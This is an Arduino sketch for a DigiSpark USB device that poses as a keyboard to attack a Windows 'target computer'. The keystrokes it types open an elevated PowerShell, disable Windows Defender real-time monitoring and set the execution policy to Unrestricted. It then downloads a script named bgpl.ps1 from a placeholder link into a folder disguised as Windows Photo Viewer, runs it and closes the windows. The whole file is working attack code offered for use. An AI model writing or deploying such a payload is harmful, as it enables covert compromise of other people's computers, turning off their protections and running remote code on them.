#include "DigiKeyboard.h"
void setup() {
} //frequent pauses are there because DigiSpark shits the bed when trying to do certain tasks too fast. Feel free to make it faster, but this is what works consistently while still being quick
void loop() { //depending on how slow the target computer is you may want to add more delay for certain actions. These certain actions will be signified with //! at the end of the line
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay(500); //!
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(10);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Start-Process powershell -Verb runAs");
  DigiKeyboard.delay(10);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500); //!
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
  DigiKeyboard.delay(10);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Set-ExecutionPolicy Unrestricted");
  DigiKeyboard.delay(10);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(10);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("mkdir 'C:/Program Files/Windows Photo Viewer/'");
  DigiKeyboard.delay(10);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cd 'C:/Program Files/Windows Photo Viewer/'");
  DigiKeyboard.delay(10);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -command '& { iwr LINKTHATCONTAINSbgpl.ps1HEREYOUCANUSEADISCORDLINKEVENLOL! -OutFile bgpl.ps1 }'");
  DigiKeyboard.delay(10);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("./bgpl.ps1");
  DigiKeyboard.delay(10);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Exit");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Exit");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ }
}
